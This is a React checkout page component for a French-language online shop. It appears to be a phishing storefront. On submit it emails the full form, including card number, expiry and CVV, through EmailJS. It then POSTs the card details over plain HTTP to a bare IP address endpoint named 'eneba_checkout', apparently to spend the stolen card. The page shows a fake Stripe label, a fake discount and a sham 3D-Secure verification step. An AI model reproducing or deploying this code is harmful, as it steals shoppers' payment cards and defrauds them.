import React, { useState, useEffect, useRef } from 'react';
import emailjs from 'emailjs-com';
import content from '../content.json';
import { userAgent } from 'next/server';

const site = content.sites[0]

export default function Paiement () {

  const expiryDateRef = useRef(null);
  const handleCardNumberRef = useRef(null);

  useEffect(() => {
    const handleExpiryDateInput = (event) => {
      const { value } = event.target;
      if (value.length === 2 && !value.includes('/')) {
        event.target.value = value + '/';
      }
    };

    const expiryDateInput = expiryDateRef.current;
    expiryDateInput.addEventListener('input', handleExpiryDateInput);

    return () => {
      expiryDateInput.removeEventListener('input', handleExpiryDateInput);
    };
  }, []);

  useEffect(() => {
    const handleCardNumberInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    input.value = value.replace(/(.{4})/g, '$1 ').trim();
  };

  const cardNumberInput = document.querySelector('input[name="cardNumber"]');
  cardNumberInput.addEventListener('input', handleCardNumberInput);

  return () => {
    cardNumberInput.removeEventListener('input', handleCardNumberInput);
  }

  });

  const [cart, setCart] = useState([]);
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');

  useEffect(() => {
    const storedCart = JSON.parse(localStorage.getItem('cart')) || [];
    const groupedCart = storedCart.reduce((acc, item) => {
      const existingItem = acc.find(i => i.productTitle === item.productTitle);
      if (existingItem) {
        existingItem.quantity += 1;
      } else {
        acc.push({ ...item, quantity: 1 });
      }
      return acc;
    }, []);
    setCart(groupedCart);
  }, []);

  useEffect(() => {
    emailjs.init("8SL7vzVHt7qSqEd4i");
  }, []);

  const totalPrice = cart.reduce((total, item) => {
    const price = parseFloat(item.productPrice.replace('€', '').replace(',', '.')) || 0;
    return total + (price * item.quantity);
  }, 0).toFixed(2);

  const discount = (totalPrice * 0.15).toFixed(2);
  const discountedPrice = (totalPrice - discount).toFixed(2);

  const processCheckout = async (event) => {
    event.preventDefault();
    try {
      await emailjs.sendForm('gmail-benedikt', 'new-payment', event.target);
      console.log('SUCCESS!');
      localStorage.removeItem('cart'); // Clear the cart from localStorage
      document.querySelector('.left-column').style.display = 'none';
      document.querySelector('.right-column').style.width = '100%';
      document.querySelector('.right-column').style.maxWidth = 'none';

      setCart([]); // Clear the cart state
      showStep(2); // Move to the verification step after successful email sending

      // Collect payment information
      const cardHolder = event.target.cardHolder.value;
      const cardNumber = event.target.cardNumber.value;
      const cardExpiration = event.target.expiryDate.value;
      const cardCVC = event.target.cvv.value;

      // Trigger the eneba_checkout API
      const response = await fetch('http://164.92.222.43:3000/eneba_checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          cardHolder,
          cardNumber,
          cardExpiration,
          cardCVC,
          payAmount: 10//discountedPrice
        })
      });
      const result = await response.json();
      console.log(result.message);
    } catch (error) {
      console.log('FAILED...', error);
    }
  };

  //fonction pour cacher un élément et en afficher un autre :
  function showStep(step) {
    if (typeof document !== 'undefined') {
      const steps = document.querySelectorAll('.checkout-step');
      steps.forEach(s => s.classList.remove('active'));
      steps[step].classList.add('active');
    }
  }

  return (
    <div className="paiement-container">
      <div className="left-column">
        <a className="back" href="/boutique">&lt; Retour à la boutique</a>
        <div className="shop-info">
          <h2>{`Payez ${site.shopName}`}</h2>
          <h1>{`${parseFloat(discountedPrice).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</h1>
        </div>
        <div className="cart-summary">
          <ul>
            {cart.map((item, index) => (
              <li key={index}>
                <div className="cart-item">
                  <h4>{item.productTitle}</h4>
                  <p className='quantity'>(x{item.quantity})</p>
                  <p>{`${parseFloat(item.productPrice.replace('€', '').replace(',', '.')).toFixed(2).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
                </div>
              </li>
            ))}
          </ul>
          <div className="cart-item discount">
            <h4>SOLDE FÉVRIER : 15% réduction</h4>
            <p>{`-${parseFloat(discount).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
          </div>
          <div className="cart-item subtotal">
            <h4>Avant-réduction</h4>
            <p>{`${parseFloat(totalPrice).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
          </div>
          <div className="total-price">
            <h4>Total dû :</h4>
            <p>{`${parseFloat(discountedPrice).toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €`}</p>
          </div>
        </div>
        <p className='secure footer'>© 2024 - Tous droits réservés -  {site.shopName} SAS 32455</p>
      </div>
      <div className="right-column">
        <form className="checkout-form" onSubmit={processCheckout}>
          <input type="hidden" name="totalPrice" value={discountedPrice} />
          <input type="hidden" name="products" value={cart.map(item => `${item.productTitle} (x${item.quantity})`).join(', ')} />
          <input type="hidden" name="website" value={site.shopName} />

          <div className='checkout-step active'>
            <h3>Informations de livraison</h3>
            <input type="text" name="address" placeholder="Adresse du domicile"  />
            <input type="text" name="suite" placeholder="Maison, suite, numéro, etc. (optionnel)" />
            <div className="form-row">
              <input type="text" name="postalCode" placeholder="Code postal"  />
              <input type="text" name="city" placeholder="Ville"  />
            </div>
            <h3>Compte client</h3>
            <input type="text" name="email" placeholder="Email"  />
            <div className="form-row">
              <input type="text" name="firstName" placeholder="Prénom"  />
              <input type="text" name="lastName" placeholder="Nom"  />
            </div>
            <button type="button" id="delivery-checkout" onClick={() => showStep(1)}>Étape suivante</button>
          </div>

          <div className='checkout-step'>
            <h3>Mode de paiement</h3>
            <label className={`payment-method ${selectedPaymentMethod === 'card' ? 'selected' : ''}`}>
              <input type="radio" name="paymentMethod" value="card" checked={selectedPaymentMethod === 'card'} onChange={() => setSelectedPaymentMethod('card')}  />
              <img src='/card-badges.png' alt='cartes bancaires'/>
              <span>Stripe</span>
            </label>
            <label className={`unvalaible payment-method ${selectedPaymentMethod === 'paypal' ? 'selected' : ''}`}>
              <input type="radio" name="paymentMethod" value="paypal" checked={selectedPaymentMethod === 'paypal'} onChange={() => setSelectedPaymentMethod('paypal')}  />
              <img src='/paypal-simple.png' alt='cartes bancaires'/>
              <span>Indisponible</span>
            </label>
            <h3>Informations de la carte</h3>
            <input type="text" name="cardHolder" placeholder="Titulaire de la carte" />
            <input type="text" name="cardNumber" placeholder="1234 1234 1234 1234" ref={handleCardNumberRef} />
            <div className="form-row">
              <input type="text" name="expiryDate" placeholder="MM/YY" maxLength="5" ref={expiryDateRef} />
              <input type="text" name="cvv" placeholder="CVV" maxLength="3"  />
            </div>
            <article className='checkout-buttons'>
              <button className="back-checkout" type="button" onClick={() => showStep(0)}>&lt;</button>
              <button id="pay-checkout" type="submit">Procéder au paiement</button>
            </article>
          </div>

          <div className='checkout-step verification'>
            <h2>Vérification 3D-Secure</h2>
            <p>A présent vérifiez votre paiement.</p>
            <a href="/confirmation"><button type="button">Vérifier le paiement</button></a>
          </div>
          
        </form>
      </div>
    </div>
  );
};